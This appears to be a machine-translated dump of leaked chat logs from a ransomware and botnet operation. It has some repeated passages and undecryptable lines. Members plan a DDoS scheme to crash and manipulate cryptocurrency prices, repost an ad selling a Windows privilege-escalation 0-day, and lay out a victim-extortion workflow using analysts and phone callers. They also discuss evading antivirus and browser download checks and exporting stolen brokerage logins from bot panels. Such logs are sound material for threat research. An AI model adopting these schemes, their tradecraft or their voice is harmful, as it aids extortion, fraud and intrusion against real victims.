what is <<\"id\">> for?
this is from source .. just write id != \" ... \
## Available identifiers\n\nThe following client field identifiers are currently supported and can be inserted into an expression code:\n\n* ```true``` - always TRUE\n* ```false``` - always FALSE\n* ```ip``` - special IP type, can be matched with ~\n* ```id``` - client-id as text\n* ```client_ver``` - client version\n* ```name``` - client name (string)\n* ```group``` - client group (string)\n* ```ip``` - ip of the client that was sent by the command /0/\n* ```country``` - client's country (string)\n* ```sys_ver``` - system version (string)\n* ```importance``` - number\n* ```userdefined``` - number
ok, it seems to be clear now

Hey! I'm working on the \"loader + bot\" assembly. I simplify and optimize maintenance, cleaning from AV detections.

I did not specialize in blockchains, although it is interesting. There is a hobby in studying the pump / dump / listing processes and the rise in the value of coins on the Binance crypto exchange. On the horizon is the use of an automated bot in these processes.
hello i have a lot of ideas

encryption / decryption, from the latter - sending files. Now I understand with llvm. if you are talking about crypto, there is no practical experience in it, I can only accept it.

OK
What did you agree on yesterday?
Everything is fine
Who has ideas on blockchain? and cryptocurrencies, where to go and what to develop. Who considers himself a guru in crypto trends?
he understands what I suggested
good
he has the same topic in other countries
it is immediately clear that the pro
and that dick won't get anything
because of their greed and incredulity
He said about you so it would be possible to work, but they already give 250k
so that's what I said
If she agreed more, he would agree
that this is the maximum that they will go
Professor is offline
I passed it on to people that you are looking for it
in the negotiator every now and then that he immediately says the maximum amount that the company told him

Hey
Hey!
Hey
I overclocked yesterday, fantasized fun functions, supposedly personal file storage, with the ability to share individual files, closed clubs of interest, entry into which would be considered by voting, open public groups for general discussion .. User reputation system to throw and intermediaries to eradicate and leave only really working guys .. You can also tie a bunch of services here, like the grandmothers did last week, when they gave the opportunity to spread the date to all hackers on their resources, even if they themselves and have nothing to do with their locker - any can put any date there for storage ..\n\nHere, under this social network, you can realize all your erotic fantasies in one place, both the exchange and file storage in the blockchain ..\nThe works are gigantic volumes, without the experience of administration we ourselves will not pull, I think that we need to attract some kind of colleagues, like xss .. this will be the evolution of our underground into something more serious ..\n\nUncles, think it all over, please, the topic is interesting, but very difficult. US..
I\u2019m not very familiar with blockchain, but I\u2019ll ask my comrades
325476 letters and all together
I did not specialize in blockchains, although it is interesting. There is a hobby in studying the pump / dump / listing processes and the rise in the value of coins on the Binance crypto exchange. On the horizon is the use of an automated bot in these processes.
hello i have a lot of ideas
Hello. How about crypto ddos? Pool mining.
encryption / decryption, from the latter - sending files. Now I understand with llvm. if you are talking about crypto, there is no practical experience in it, I can only accept it.

Hi what are you doing
Hello. In short.\n\nWe find young forks on exchanges (those that can be mined), analyze their infrastructure. Where are the servers, nodes, capitalization.\nWe find a place where crypto holders communicate (discord, etc.).\nFind out the IP of the node. Most likely it will be IPv6. We start ddosing. We fly into the chat that we found earlier and write that there are problems, the crypt is not displayed, operations are not carried out. (because the crypto depends on mining, there will really be problems).\nHolders start to get nervous and bring out the main balance. Crypto falls in price. We buy at a low price. We release ddos. Crypto is growing again. We are on the plus side. Or a variant of a letter to the creators about the possibility of a ransom if they want the ddos to end. From the main problem points, this is the implementation of DDoS Ipv6.
a good idea
how to find out the ip-node?
[Error: The message is encrypted and cannot be decrypted.]
Yes
got
but didn't understand anything
we have a goal of 10 reverses for the laboratory to be
how is the search going? is everything difficult?
collect at least until the end of the year
and distribute tasks and receive results
if you need to buy iron
[Error: The message is encrypted and cannot be decrypted.]
[Error: The message is encrypted and cannot be decrypted.]
wrote 2 test messages
Find cold wallets, especially large holders, and see which ips they connect to (roughly speaking, do a reverse, these ips will be nodes).
I have something stopped switching encryption
do you see the message?
and I sent you a new public key
yes i installed it
1 test see
ah, well here
it means it works
[Error: The message is encrypted and cannot be decrypted.]
But how to turn back the encryption switch button?
look for the button on the right

those. you can't enable encryption
and earlier could
and attached this new key to the account?
and now already overloaded 3 times and nifiga
I created it there.
wait a minute
you created it in the plugin
now select accounts
there, select a tor toad account
click change

Since the FBI is so actively banning us from paying and advertising it through all possible channels, can they release some kind of response? supposedly give some kind of interview, where to get lost and describe the situation, tell what they say is so and so, but if the terpils turn to the FBI, they will definitely say goodbye to their files and it\u2019s not good for them themselves .. to carry out propaganda work, so to speak .. what do you think about about this?
there will be an overkill right?))

Hey
Good afternoon. There is a 0-day privilege escalation exploit for a Use-after-Free vulnerability in the WIDFRD.sys driver. The exploit was implemented for Windows 10 x64 1607, 1703, 1709, 1803, 1809, 1903, 1909. The vulnerability exists in 2004 and later, but the corresponding code in the driver was rewritten, and the OS crashes into a BSOD before the target null pointer dereference vulnerability is triggered . There are some nuances in operation: not all systems may be vulnerable, as there is a dependence on the hardware configuration. Operation occurs by disabling SMEP (modification CR4), modifying PTE/PML4 if necessary, and executing the code that replaces the token for the target process with the system one. I am publishing an ad here, because my regular customers do not need / did not fit, and in a personal message from those who expressed a desire to buy on the forum, no one answers. Price - 60k, negotiable. For those who wish, I can write and issue a utility that, when launched on the system of interest, will tell whether the OS is vulnerable or not. The first contact in the LAN, then in the jabber.\n\n\nI will add:\n\nThe exploit is sold in one hand.\n\nVideo of work:\n\nhttps://filetransfer.io/data-package/ctyCDTW6#link\n\nPassword bvdiviy2861rVJVl\n\n \n\nWhat's happening in the video:\n\n1. The wud.exe process that exploits the vulnerability is launched.\n\n2. wud.exe spawns a cmd.exe process and pauses for 5 seconds to check privileges.\n\n3. I launch notepad.exe from the created console (instance 1).\n\n4. After some time, I check the privileges and run notepad.exe (instance 2).\n\n5. In Process Explorer, I check the cmd.exe level and alternately 2 instances of notepad.exe. It can be seen that instance 1 is launched with medium IL, the second (when the rights of cmd.exe have already been elevated) with SYSTEM.
In general, not everything is so bad. Bots are coming, Hors took 4 nets yesterday :)
Good morning. I'm waiting for the files on the crypt

Since the FBI is so actively banning us from paying and advertising it through all possible channels, can they release some kind of response? supposedly give some kind of interview, where to get lost and describe the situation, tell what they say is so and so, but if the terpils turn to the FBI, they will definitely say goodbye to their files and it\u2019s not good for them themselves .. to carry out propaganda work, so to speak .. what do you think about about this?
there will be an overkill right?))
gave access to the sat* group to the dnog admin panel, dropped love for hash, acc rrrrrop
In general, not everything is so bad. Bots are coming, Hors took 4 nets yesterday :)

Good afternoon. There is a 0-day privilege escalation exploit for a Use-after-Free vulnerability in the WIDFRD.sys driver. The exploit was implemented for Windows 10 x64 1607, 1703, 1709, 1803, 1809, 1903, 1909. The vulnerability exists in 2004 and later, but the corresponding code in the driver was rewritten, and the OS crashes into a BSOD before the target null pointer dereference vulnerability is triggered . There are some nuances in operation: not all systems may be vulnerable, as there is a dependence on the hardware configuration. Operation occurs by disabling SMEP (modification CR4), modifying PTE / PML4 if necessary, and executing code that replaces the token for the target process with the system one. I am publishing an ad here, because my regular customers do not need / did not fit, and in a personal message from those who expressed a desire to buy on the forum, no one answers. Price - 60k, negotiable. For those who wish, I can write and issue a utility that, when launched on the system of interest, will tell whether the OS is vulnerable or not. The first contact in the LAN, then in the jabber.\n\n\nI will add:\n\nThe exploit is sold in one hand.\n\nVideo of work:\n\nhttps://filetransfer.io/data-package/ctyCDTW6#link\n\nPassword bvdiviy2861rVJVl\n\n \n\nWhat's happening in the video:\n\n1. The wud.exe process that exploits the vulnerability is launched.\n\n2. wud.exe spawns a cmd.exe process and pauses for 5 seconds to check privileges.\n\n3. I launch notepad.exe from the created console (instance 1).\n\n4. After some time, I check the privileges and run notepad.exe (instance 2).\n\n5. In Process Explorer, I check the cmd.exe level and alternately 2 instances of notepad.exe. It can be seen that instance 1 is launched with medium IL, the second (when the rights of cmd.exe have already been elevated) with SYSTEM.

Hey
What are you doing now?
Hello, how are you with the locker?
Hello.
Dropped the multithread. We received new requirements for encoding large files.
Finish today and tomorrow.
Unexpectedly faced with the development of AB on VSS.
I decide right now. Busy with this.
Hello. Could you please specify what to test terry in BC?
I will decide today.
Hope...
Oh, my friend, we are constantly being bombarded with new requirements. :-)
And so, it plows perfectly.
Without VSS, yesterday it was possible to give to work!
Hey
he must upload the encrypted file to the web somewhere
and then download it from different machines from the chrome browser
and run
to work and knock
Clear. I will organize.
Hello, how are the lockers?
Are there requirements for the protocol, architecture, modes of operation, additional requirements?
Dude, you've created your own engine. Works great. AB is an empty sound. But, as soon as you try to manipulate with VSS, we immediately burn.
This is clear. The mechanism is against us.
Let's do it.
the main thing is to download from chrome
straight exe file
not to be blocked
Clear. It's just that there's still a question in the hosts from where it swings. Here, too, there may be nuances.
What are they complaining about?
Workouts are an isolated case.
The task is clear.

Hey
Not
Since you did not know about the ban, they did not issue
Next time I will issue
OK
but it's not a hospital
What uh
i watched a hundred times
The site looks like a hospital
they have no resuscitation, etc.
they mainly treat sports injuries
they have insurance for 3kk
that's why they screwed up
well studied them
I don't lay everything
OK
But we decided not to touch the health sector at all, even like this, so let's now bypass them.

updated crypt on ftp
can you call alter?
let it out
I'll try
thanks
and the question is when will linux locker be ready?
He is offline
On Linux, for some systems you need to rebuild
And so it's ready and tested
For example, esxi below 6.7 does not start, it is necessary to collect with old libraries
and can you also insert that the picture that I will give was put on the desktop and that it would not be localized at the lock?
Yes
hi bro)

hi.
There was a problem with the sia daemon hanging. That is, it started up, and after a while stops responding to RPC http requests. It seems that it was fixed by the complete removal of all files and renter data (contracts and other data). I recreated them, it seems, it stopped hanging. You also need to file the backup script a little, so that if it fails to upload backups to the server, it tries to upload again.
In general, it is not very reliable yet. There was an idea to make two backup servers, so that one was redundant, and in case you need to erase everything, you could restore from the second one.
In the meantime, even the developers themselves believe that Sia is not suitable yet as the only place for backups.
At me while in a test mode three servers are backed up on Sia.
bro, he says that he was asked to send an acc from the social network and was not sent. Will I take it tomorrow then?
can you provide security report while data is still uploading.

They - in sense, developers? Now the Skynet theme is being actively promoted. Right now, the developers have concentrated on it. The capacity of the network is gradually growing - about 3,000 terabytes of free space are already available, of which about 900 are occupied.
Plz start personal correspondence, it's strange how Psi + crashes with a new imprint. Just for checking
So everything is slowly evolving. Although in some places, the technology is still raw. There is a possibility of losing data. But in my opinion, among such technologies, Sia developers are the most advanced. And the system requirements are minimal among competitors.
Today Adam asked me about this topic - I think he will give you the results of the conversation.

Hello. Tom-y unsubscribed the triplet files for verification. There are nuances. At startup, a smartscreen window pops up asking you to confirm the launch of an unknown exe. Plus, chrome doesn't allow you to download exe from a direct link anyway (example site.net/file.exe). It downloads from third-party exchangers, tom checked it. Well, he will unsubscribe himself, I think. These are the links for today: privnote.com/qnWwYXQQ#3TLtk0rXt

According to the smartscreen with a warning, so far the opinion is that it will still climb out when you run the exe downloaded directly\n\nYes, I have already discussed, maybe not exe, but what kind of js file or something else

Zeus has a token ready, we are waiting for the hof / def so that the injections are stuck\n\nI passed the VNC module to another encoder, because both Tom, Zeus, and Derek are asking for it very much. well, in general, it seems to be necessary) now grem is doing it\n\nWho is Bill found \\ brooks in the rocket - told him that you are urgently looking for him
\n[16:16:06] <professor> with his developers, we\u2019ll write some cool garbage so that there is plenty of soap for spam\nto gut the exchange\n[16:16:11] <professor> otherwise our oxen have been fucking for a month with this task
How are you getting on with your professional work and just do it?
are there any results? straight results
\n[16:16:55] <professor> well, according to devops, as I planned, I included everyone in a single \"cauldron\"\nlet them fucking write at last\n[16:17:06] <professor> otherwise we again have 100,500 products and everything is at the \"we should test\" stage)
\n[16:19:59] <professor> yes, he scored projects\nhanded out tasks\nand no one fucking can bring it to the end without him\n[16:20:02] <professor> this is the main problem\n[16:20:10] <professor> is taken by himself if - everything is sawn right away as it should
this is about you
\n[16:20:24] <professor> I took the encoder a month ago for comparison\n[16:20:26] <professor> gave him 30k bucks\n[16:20:34] <professor> he made me a loader with a beadler and an injector in 3 weeks\n[16:20:41] <professor> and immediately took another project while finalizing this one\n[16:20:47] <professor> but it's expensive of course)

According to the assembly trick, a new person in the rocket is made by the nickname Ned, he assigned a tester to him, they will run the modules. It would be nice to take 1 more tester\n\nBought acki shodan and signalhire for new osint department. Zoominfo is still in the process, no one does this online if they sell current from the logs, but such accounts are immediately fired, so if you only do it yourself, but it\u2019s not easy, they give you a video call through zoom.\n\nI\u2019m waiting for the horse, we\u2019ll continue to unload the nets from plowing, it didn\u2019t work out on Thu Fri, there were troubles with payloads ..\n\nDid you come up with anything on carbon fiber?

while ideas and full understanding are needed
bro come on
give me wisdom
let's
what is there
in)
in general the situation is like this. about the RFP for the pro team. Whom we bring to him - me or the wirep - we pay the RFP. Whom they find themselves - they pay themselves. There begins garbage that they themselves will not figure out who they are paying there who is not. He said ok and silence. It's just that in all our chats there are people whom we and the professional pay, even at the reverse. I suggest that there was no confusion and it didn\u2019t stick to anyone there by chance (the last time there were a couple of attempts, but I missed it)) - you need to decide Either I pay everyone for the RFP, or let them chat with pentesters where the prof - they themselves pay everyone .
1) we want to create our own crypto system by type:\netherium, polkadot and binance smart chain, etc.\n\n2) Does anyone know more about this?\n\n3) Study these above system, code, principles of work.

So that others can already create their own coins, exchanges and projects on our system.
Hi Yes
Okay
I will discuss with reverse today
i need a list of people
all or just reverse?
We have developed a painless concept for data analysis and calls / blackmail. I proposed to Buz the following scheme:\n\nWe have a separate reconnaissance rocket. there is a group on requests - there hackers are asked to put pressure on or prepare this or that company. we pass it on to analysts, they make a dossier report. if blackmail\\calls is required - we transfer this task to the callers. In order for callers to work effectively and not to call into the air, as it is happening right now - they are in touch with analysts, they can request any additional data from them\nlet's say part of the date listing, or some kind of info about computers \\ passwords\nIf the company does not make contact, its data is transferred further for publication on the site. (to do this, you need to pull up either a reshaev or some of his support in this chat)\n\nthe essence of the problem with calls is such that most often when calling, the caller gets to the reception where some kind of tpshka does not know the situation at all. and in fact we just got you out of nowhere with such a call, you need some kind of proof to get a result, and not just hang up or send calls ..\n\nIn principle, everything is already working, you just need to tune it up and so that hackers start using it. I pulled a gang of dereke, horsa, and I\u2019ll pull the reverse ..
Today I will prepare up-to-date lists for salaries and amounts, but it would be nice if you decided everything today for the people of the reverse
and I also need to return money for unaccounted for RFP and for carbon) and bonuses and premiums
so that sq8 is enough)))
on the social network pliz 2 days I also need to pump out my thoughts, the fantasy played out while on the weekend under Chivas I thought about it all, I\u2019ll formulate everything right now and sign the plan in the evening. while loaded to the very tomatoes ...

Hello. How are you?\nwhat are your results?\nWhat are the tasks?\nWhat ideas do you have that can be added and improved?
Is there anyone among us who considers himself a guru of blockchain and trends. Who knows where to go in this direction and what to develop ... What ideas does anyone have

repeat pliz bro cut everything neg
According to the professional - I spoke with him, he said that you yourself decide everything there and tell me what to do, as a result, there was no information from you or from him ..\n\nBro, if possible, please pay a little more attention - I try to work on all your Wishlist, and you read everything through the line. and you ended up talking to him about the blockchain. I understand that the social network will be on the blockchain, but the development of the social network also needs coders - here he has them. As for the part of the blockchain, we will look for other people for this .. so, in the end, you didn\u2019t talk to him for that at all, well, or I don\u2019t understand something correctly in the tasks that you set\n\nEbash here day and night on all fronts what you put, I want you to be happy with everything there, I constantly show some kind of initiative, and in the end you answer once a day at best ..\n\nAnd about the fact that he pulled up someone close - well, yes, he pulled it up, through his brother he found the right people to solve your problem. Nobody can do that to you online. And offline, I don\u2019t think that you will find the same frostbitten guys who will agree to risk a normal white company with a good turnover and reputation, and even more than one in the end. I didn\u2019t find it, and no one else would have found it, it\u2019s not for you to buy coke on a hydra, there the private security service works like in the white house. It was just a fucking difficult task, and in the end we put the squeeze on it, bought it. I also promised the guys on my own behalf heifers and a sauna, because it really was, well, not very easy. The same goes for Alka - you set the task of solving her problem. I go out of my way to solve this, since I have good opportunities in this area - but again, this is all offline, through a trusted person in whom I am 100% sure. I perfectly understand that this is at least a thread to me. And I also understand my personal risks. But I do your request as for myself. In general, I try to solve all these very extravagant quests of yours. I worry about the results of the whole team as if they were my own. I get upset when negativity flies at the trick and I try to fix it all, fix it and finalize it .. I save your money like my own, I demand reports from everyone, I bargain with everything, I collect sanctions if there are such people for someone .. Everything is always clear on all financial issues and several times I unsubscribe to you what was spent where and how much, why and why. But I have a clear feeling that you are not interested in all this at all. I'm not an extrasensory. I can't think of your cunning plan and all your wishes for you. Unsubscribe then tasks more precisely. I wrote about offline that I would do it through friends - I wrote this all the time. You didn't say a word. And now you're saying you can't. We also talked about the budget of all these movements more than once - you wrote that ok, 50 60k norms suits you .. And then it turns out that you don\u2019t need it anymore. I am writing that we have people whom we did not take into account earlier - I know that you do not have time for this, I decide the issue with them myself so as not to soar you and not beg for the next 3-5k, I unsubscribe everything to you and write down where and for what was spent - and you don't even remember about it.\nYou constantly make me think that you are not interested in what is happening here, that no matter how hard I try for you, I bring some results - and you fucking remember after 2 days about it .. \"then, tomorrow, yes, ok\" This for you, these are all trifles, but I lived here all my life until I organized and muddied all this. I will be so gray in a year.

hi
I mean, how do you make your own blockchain?
It's deep in the code you have to dig.
Or do you need to raise the Ethereum blockchain server, and attach some kind of engine for a wallet, exchange, exchanger to it? Those. Do you need to raise some kind of infrastructure on one of the three listed blockchains, or do you need to fork one of them, sharpen it for yourself? That is, what exactly is needed, and what should be included in this infrastructure?
To be honest, I have no idea about NFT, DEFI, DEX And how they differ. I only know that some types of tokens. In general, I have only been in the topic of blockchains for the last 2 years. I'm afraid that in a week I'll only understand very superficially.

hi, did you figure it out?
he agreed to work with us, we paid him a week, he made several files in a week, and then we sent him to the fruit drink, what he would do to him. They tried to try there, but they didn\u2019t make a normal file. And then he said that until he would work with us, he had some projects of his own there
the strange thing about all this is that he did not work with us, but at the same time he was sitting in our toad, it turns out, since he caught your newsletter on the blockchain ..

answer in rocket
1) we want to create our own crypto system by type:\netherium, polkadot and binance smart chain, etc.\n\n2) Does anyone know more about this?\n\n3) Study these above system, code, principles of work. To build our own, where it will already be possible to stick NFT, DEFI, DEX and all the new trends that are and will be. So that others can already create their own coins, exchanges and projects on our system.

1) we want to create our own crypto system by type:\netherium, polkadot and binance smart chain, etc.\n\n2) Does anyone know more about this?\n\n3) Study these above system, code, principles of work.

Hey
ghbdtn
Hey
Are you a newsreader?
they send them to me)
I went through all the coders, updated the current projects
If you really need something, I'm aware of all the movements :)
[Error: The message is encrypted and cannot be decrypted.]
found an option to buy an acc zuminfo for 2 buz managers for intelligence price 2k
budget if they don\u2019t throw it, of course, you can do it through the guarantor
I remind you about the social network and a bunch of other things)
carbon, etc.
:)
lf 2r
yes 2k is possible without a guarantor
by tom@ you need to run it
from our side, everything is ready for a long time
the cryptor is an external ret, it crypts well. I can't get over to us. but we sometimes have a need for his crypts when ours are on purges or cannot get around something
the last 1k threw him on the balance
according to tom@ if his scheme does not work, take expensive certificates
order them
sign bq
I still need to pay for the test tasks, the designer who draws the social network, I paid for everything and gave him money a little in advance to buy a separate modem, etc., etc., I conducted a course of lectures on security ..
and run there
and I would return the cue balls, and take the carbon from me ..
and everyone probably got the salary already, but you don\u2019t even remember about me)
let's return the beats
how much do you remember or write everything again?
I don't remember tell me how much and that's it
without timetables
on social networks need movement
[06/28/2021 18:12:55] <mango> for carbon I need to return 1.32 bitcoins at the rate on the day I paid for it) and I also need to return 12.5k for RFP to new people from the previous payment and what to buy carbon itself threw
Well, if you can send me a RFP immediately, I will be very happy)
1.32 BTC is for today at the rate of 44100 +12.500\n56600
you can also send a bonus so that I have enough on the C line :-D
I made networks, I made carbon, I came up with a social network, I move everyone here, I fuck everyone's brain
fraternally came in so that I could work in comfort and coziness
Yes, you take a bonus from those who sold this carbon to you
which is no longer needed
throw off the cat
we will return the money to them, and let the carbon lie, all of a sudden something will be needed later
I dealt with them a long time ago
yes I understand
well, I'll give you back
they kind of waited a week, you left me no choice ..
what's the difference
why is it not needed in the end?
no one to do or what?
let's sell it, there is a demand for it, as it were
yes, it was just necessary for the ryuks
they wanted to explore
it took a long time to make
and then they refused
or they did it to themselves
let's explore
Well, in the end, we did not raise this topic with them.
I asked the pro
does it need carbon?
he said not yet
well, you can
but there is no time
booza wants to explore himself
but he has no purpose why
you can give hors@
chat with horse
throw off the cat
let me think of something with a horse
this topic
I think he will be interested because they often pop up nets with carbon
What kind of social networking is needed?
by social network
we all ended up wanting to formulate our goals ideas so that I don\u2019t fuss too much
I think it should be launched with minimal functionality for now
Well, for now, this forum is only beautiful and closer to the social network
here toak
balances, deposits themes people
messages there , guarantor etc
btc, ether and monero to accept payments add
functionality during the battle
not just btc
Yes
you need to understand how a social network should be
where is the sale
where are the auctions
so far only accepting deposits/payments between participants? no exchange, etc.
can unite it with someone or something
can exchangers be introduced there somehow
think
Well, I told you everything in TK on what you can earn there
let the designer draw
what can be done so that the participants themselves donate to each other for info / training
who painted green
Yes
[14:52:19] <zevs@q3mcco35auwcstmt.onion> another question, kick pzhl defa in the archives, maybe we can find something for the trade, a good topic is profitable there
I understood everything in short, while we are building the frame, then we will finish
you there and did not give them the archive?
week is gone
even the bonus for Zeus did not motivate you
bc1qfamjhlyec63dz3gvcum7s9guu3cp5n8v3hz7ud
me 56600 + sn
well, give bonuses for networks there, for containers, injections and other delights of life)
on the line so that I was like a cool
1.32 is this for carbon?
and you need 3k to work
I won't give you anything for containers
this is for the company purely for which carbon was made
so far it's useless
injections too
yes I mean it)
I don't tune)))
at least give me back))))))
I understood from the networks that your man works with the horse
3 weeks already waiting
there we will understand, he continues to give nets?
Yes
I will return yours
bc1qfamjhlyec63dz3gvcum7s9guu3cp5n8v3hz7ud
here 1.32 ?
yes, but he is on vacation this week
or how much
everything is possible there
Spaniard?
yes, will be from monday
johnny works too
and a couple more people in the process..
reverse gave vpnov and there is silence
I remind you a couple of times, but right now, the people who gave it are gone ..
this tactic is like waiting for the unnecessary ones to weed themselves out - bro, I may not understand something here, but it seems to me that it\u2019s just those who want to work right here and now to be weeded out in the end ..
and those who just want to get a salary, they will sit quietly and fuss minimally ..
in my opinion..
Well, of course I didn't understand anything.
and you understand me better
how to
no, I don't say that)
I have 100 people here, half of them even 10 percent do not do what they need
and they only ask for money, because they think that they are fucking useful
there is a person frog@ his nickname
bq does
he did not take salary for 4 months
then hit
says I finished it
give salary for 4 months
I checked really did not take the money
I ask why you did not write
he says i wasn't happy with myself
and there are those that you yourself warm for no reason, but you say not to remove them
how to finish it wrote
we need such people
and not those who ask for salary every month and write
for example, the drunk men was wasted with his lights and a drunken baguette
I have good cryptos
let him crypt
according to the baguette it will be clear in a month
he diavol completed the locker
he is on tests with a pro
and his teams
like clean from av
baguette if you do not pay, he will not leave
he asks asks but does not leave
he won\u2019t drop out if he doesn\u2019t even get paid for a year
such a person
he's already here
submitted several projects
I just understand that many have relaxed, because you don\u2019t really ask, and then they always find options to make excuses
well the encoder came
he was given 30k
until I raised the topic that the stealer works crookedly and does not grab what is needed - everyone told me that everything is clear there
and they said give the loader clean
he issues a loader in 3 weeks
until I poked it right..
clean
pure
we have 16 people making bk loaders
more than a year
no pure
and tl
etc
well, with bots like Derek bro, it\u2019s hard to keep him clean, I think
Hey
if he is at work, he quickly burns
here the main thing is in what hands is it all
write me back
I finished mine
and when they make 500 bots 400 of which are honeypots - then don\u2019t clean it ..
need your urgent work on storage
I didn't rule anything in SMB
and I could not debug normally, I have something with the balls
the engineer module, only now I fussed, cleaned everything, asked for Zeus to be stuck - on Friday the only day when it was tested - and already burned during the tests
well, to check write permissions
Derek has 1 bq
and we have 5 or 6 of them
there is still such a moment that almost all of them do not understand the full picture of how it works ..
that is, one thing is coders who have been working with malware for a long time, and another thing is that ours, they partially stick pieces of code there, but the three themselves have not seen in their lives and how it should be and why they don\u2019t know
and those who know for 2k naturally will not work.
right now we are looking for new people on the hack forums. in the announcement, a salary of 2k is indicated, there are a lot of comments that we are recruiting galley slaves) of course, how can we dispute that they say those who work and bear results get more, etc., etc. 10k earn .. in short, it\u2019s difficult to negotiate with them all
juniors go for 2k..
there are only intermediaries on hack forums
that's why they write
just do encoders in Russia for
intermediaries to hell
from 60k rub
up to 300k
for 300k in order for the encoder to have a job, he should be very lucky
therefore, I propose to use the social network at the initial stage, by the way, in order to create credibility and excitement - let it go by guarantee / vote
Google pays 300k in Russia or Microsoft to top coders
that at first it\u2019s supposedly purely for the cool ones who are in the subject, and then the rest, so that they themselves would have an interest in getting to us
how was it with thecc
thecc was shit
there are 10 cripples
no movement
I was put there
I was there for a week
not in those days you saw him, then)
after half a year came oyat
nothing has changed
coolest forum ever
thehack
and verified
in Russian
there, at the end, when the fly became the administrator, good movements began, people tried to get there 2-3 times, it was just that he began to organize the movement, but unfortunately he was then accepted and it all ended abruptly
verified leaked in the spring
there must be at least 1 million people on the social network
they have now recovered, apologized and continue to work as if nothing had happened
yes all forums
listen, can we do this as a white project?
drained
this is normal
just with a footnote that we are not responsible for what happens there
this is the white project
just black moves
)))
everyone will be there
reporters
ordinary users
buyers
sellers

[Error: The message is encrypted and cannot be decrypted.]
it is necessary to think of all the stores in one place
make them pay there
and your percentage
pay 20 cents
by the way, I\u2019m thinking of moving to Moscow time and trying to open a company there on a PC, I\u2019ve been hatching this plan for a long time .. first recruit system field engineers, then pull up a couple of designers / copywriters - advertising and sms pull up, and when the staff is formed - you can outsource which companies then. it\u2019s clear that there isn\u2019t a lot of money, but 1 you can slowly select the people you need under 2 you can periodically do some kind of gray topics, like with carbon.
well, you want it to be like on OZONE, a platform where virtual tenants offer goods / services
Are we going to specialize specifically in hackers and carders?
it basically doesn't change anything. wechat on the darknet, that's all,
a large forum with a convenient communication option and additional functionality. at the initial stage - what competitors have, advertising, deposits, etc., etc.
some kind of idea and a trick you need your own than to bribe people, it\u2019s not just there once to turn up and forget, but so that they want to return and hang out there all the time
for this, I thought up so many things in terms of functionality there, but you didn\u2019t appreciate how I understood it)))
not a good idea
straya
10 years ago it was necessary
do
now it's better to manage the team from a laptop
without firms
and you need to hire people who understand and understand blockchains
there are all the grandmothers
[15:14:05] <mango> well, you want it to be like on OZONE, a platform where virtual tenants offer goods / services\n[15:14:18] <mango> we won't specialize specifically in hackers and carders, shall we?
Yes
hydra type just for stolen data
plus forum
different languages
the forum is not the main topic
the main thing is trade
communication comes second
plus news
and discussions etc.
we'll put it up later
maybe we'll make a casino.
there
Hello.
I am in touch
What should be done?
\n[15:16:21] <mango> for this, I invented so many things in terms of functionality there, but you didn\u2019t appreciate it, as I understood it)))\n\n\nI have estimated so far only the payment to my employees of the RFP (beautiful, unloaded me) and the second is that you kind of adjusted it for the horse
you dealt with storage how to pull out the data from there?
I need two files in txt, from each admin panel
download such data
Country\nBot ID\nlink: etrade.com\nlogin\npass
need two txt
[Error: The message is encrypted and cannot be decrypted.]
for each admin
download all accs
[Error: The message is encrypted and cannot be decrypted.]
now and upload it to me in a zip archive with a password on sendspace.com
[Error: The message is encrypted and cannot be decrypted.]
Listen to what you appreciated there, didn\u2019t appreciate it - I don\u2019t worry about it. You say what you need, I do. I just wish it wasn't empty
in the zip archive, I repeat, there should be two txt. each txt is an admin panel. and akki go all from top to bottom
and I then I try to paint everything I fantasize
via a specific link etrade.com
and you don't even read it
you say i want this and that
download from Browser Access
do not download without a password, only if you have both a username and a password
but I took all this into account and came up with it - you just didn\u2019t read or didn\u2019t understand
you say you need ideological ones - I still need to look for more ideological ones) I am very imbued with all this and I do it as for myself, but damn there are moments in which, without you and your attention, well, there\u2019s simply no way
so I asked you to decide what the social network is, centralized or not, open source or not
In fact, do you need accesses with a login-password for a specific etrade.com link?\nDownload from both admins and upload via sendspace.com\nis everything right?
and you don't even remember.
centralized

Hey
how are you?
are you with the driver now?
here is a good solution. it is necessary that the composition is stable and tasks are clearly distributed, otherwise, as a result, people are fucked up and the overall project does not work
[Error: The message is encrypted and cannot be decrypted.]
[Error: The message is encrypted and cannot be decrypted.]
there is no connection with the tour by the way?
it has an importdll module, it has a super browser, I would like to take at least the source codes, otherwise it hasn\u2019t appeared for months
importDll similarities for bill@
he did it
for all these modules - you say that we need advers - but damn bro they won\u2019t work if we have nothing to offer them .. Therefore, since the trick is our vaseitka, it should be a direct reference
and tunri sources from the def in the gita
he just cleaned
there is an import source, there is no superbrowser source
banking is dead
I xs what else do you want to squeeze out there)
even the researchers are in awe
that you add an injector to the trick)
new advers all work according to inzham
everyone was surprised)
and ktstai everything is pouring bro
well, come on, let's see.
I don\u2019t communicate with anyone - everyone pours. hard but it works
and who is lying?
AZ that I had before - right now the type loads 3-4k bots a week, uploads 100 150k a week
Zeus is a new person - they also work on the US token
YUS generally walks well, but there are topics you need to know
and pour as far as I understand purely by cookies + login passwords
and the clothing goes too .. it's all small and we're not interested, I understand all this
but this is interesting for advertisers, they maximize the profit of their loads
[15:31:13] <mango> AZ that I had before - right now the type loads 3-4k bots per week, uploads 100 150k per week\n\n\ntake his corps
I am sure that with us he will do more than 100-150k per week
for 3-4k bots
they are ready, I offered them to work on a trike
they said that the trick is dirty shit that no one supports))))
I justified myself as best I could, but it's hard to argue of course)))
it was like that for a while, now hof cleaned it under zeus
give him bk
but the trick has a worm
he will make 10k bots out of 3k bots
there are jambs on importing dlls, some of them were corrected, and some of the problems remained. plus the injector worked crookedly, plus the stealer didn\u2019t grab everything) in short, there\u2019s something to fuck
and the most important Wishlist for everyone is VNC norms
and reproduction is debatable if you work on inzh, because during reproduction, bots immediately fall off in subnets .. and as far as I understand, bots from reproduction do not go to their admins, but to separate ..
in short, if everywhere there are moments, but it seems that right now they have tightly taken up this, a month or two and everything will be ok. but you need to change the tourney, and decide something with the VNC
I'll leave for a couple of hours, don't forget to send me cue balls there

bots from breeding will go to them
yeah got it
Do you really understand how storage works?
threw off 1.32
what else do you need to remember
Hey
and who are you downloading bots from hash@?
Hello, there weren't really any bots there. He gave one big bot to the reverse, but they couldn\u2019t jump there
and so if 10kk somewhere, then Horsu
Bobi has not yet thrown off, because. there is nothing. I try to divide between horse and bobi
and from 10k was something?
Yes, there were a couple, but they either couldn\u2019t jump there or the corp went off
[Error: The message is encrypted and cannot be decrypted.]
[Error: The message is encrypted and cannot be decrypted.]
[Error: The message is encrypted and cannot be decrypted.]
Yes
[Error: The message is encrypted and cannot be decrypted.]
[Error: The message is encrypted and cannot be decrypted.]
